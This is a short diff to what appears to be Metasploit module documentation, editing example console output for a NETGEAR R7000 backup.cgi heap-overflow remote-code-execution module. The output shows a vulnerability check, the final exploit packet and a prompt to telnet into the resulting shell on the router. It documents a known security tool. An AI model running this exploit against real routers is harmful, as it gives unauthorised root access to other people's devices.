@@ -51,9 +51,8 @@ msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > run
 [*] Executing automatic check (disable AutoCheck to override)
 [*] Router is a NETGEAR router (R7000)
 [+] The target is vulnerable.
-[*] Sending 10th and final packet. The exploit should hang at this point.
-[*] Connect to the telnet shell by running: telnet 192.168.1.1
-[+] Exploit complete, connect to your shell!
+[*] Sending 10th and final packet...
+[*] If the exploit succeeds, you should be able to connect to the telnet shell by running: telnet 192.168.1.1
 [*] Auxiliary module execution completed
 msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) >
 ```
